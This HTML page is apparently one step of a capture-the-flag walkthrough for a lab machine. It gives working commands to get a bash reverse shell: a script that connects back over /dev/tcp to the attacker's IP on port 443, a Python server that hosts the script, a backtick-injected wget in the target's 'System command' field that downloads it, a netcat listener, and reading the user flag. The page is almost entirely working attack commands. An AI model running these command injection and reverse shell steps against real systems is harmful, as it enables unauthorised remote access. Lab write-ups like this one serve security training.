<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.1 Create a bash reverse shell (First flag)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>4.1 Create a bash reverse shell (First flag)</h1><br/><p></p><p>1. On your Kali Machine create a file called “shell.sh” with the following content.</p><p>    <div class="codebox"><pre><span style="color:#0000ff;font-weight:700">#!/bin/bash</span><br /><span style="color:#a52a2a;font-weight:700">bash</span> -i &gt;<span style="color:#a52a2a;font-weight:700">&amp;</span> <span style="color:#a52a2a;font-weight:700">/</span>dev<span style="color:#a52a2a;font-weight:700">/</span>tcp<span style="color:#a52a2a;font-weight:700">/</span>192.168.12.60<span style="color:#a52a2a;font-weight:700">/</span>443 <span style="color:#a52a2a;font-weight:700">0&gt;&amp;</span>1</pre></div></p><p></p><p>2. Change file&#39;s permissions  .</p><p>    <div class="codebox"><pre>$ <span style="color:#a52a2a;font-weight:700">chmod</span> +x shell.sh</pre></div></p><p></p><p>3. On your Kali Machine create a python server.</p><p>    <div class="codebox"><pre>$ python3 -m http.server</pre></div> </p><p>   </p><p>    <span style="color:#ffa500;">Output:</span>   </p><p>    <img src="images/1112-1.png" alt="images/1112-1.png" /></p><p></p><p>4. On the victims machine make a commands sustitution to bring the shell.</p><p>    <div class="codebox"><pre>System command<span style="color:#a52a2a;font-weight:700">:</span> <span style="color:#a52a2a;font-weight:700">echo</span> <span style="color:#a020f0;font-weight:400">`wget http://192.168.12.60:8000/shell.sh`</span></pre></div></p><p>   </p><p>    You can see on the shell with the python server a new connection.</p><p>   </p><p>    <span style="color:#ffa500;">Output:</span> </p><p>    <img src="images/1112-2.png" alt="images/1112-2.png" /></p><p></p><p>5. Close the python server.</p><p>   </p><p>6. On your Kali Machine open a “netcat” connection on port 443.</p><p>    <div class="codebox"><pre>$ <span style="color:#a52a2a;font-weight:700">sudo</span> nc -nlvp 443</pre></div></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1112-3.png" alt="images/1112-3.png" /></p><p>   </p><p>7. On the victime&#39;s machine run the following.</p><p>    <div class="codebox"><pre>System command<span style="color:#a52a2a;font-weight:700">:</span> <span style="color:#a52a2a;font-weight:700">echo</span> <span style="color:#a020f0;font-weight:400">`bash ./shell.sh`</span></pre></div></p><p></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1112-4.png" alt="images/1112-4.png" /></p><p></p><p>8. Run the following commands to get the flag.</p><p>    <div class="codebox"><pre>brad@crazymed<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">ls</span><br />brad@crazymed<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">cat</span> user.txt</pre></div></p><p>   </p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1112-5.png" alt="images/1112-5.png" /></p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
</body>
</html>
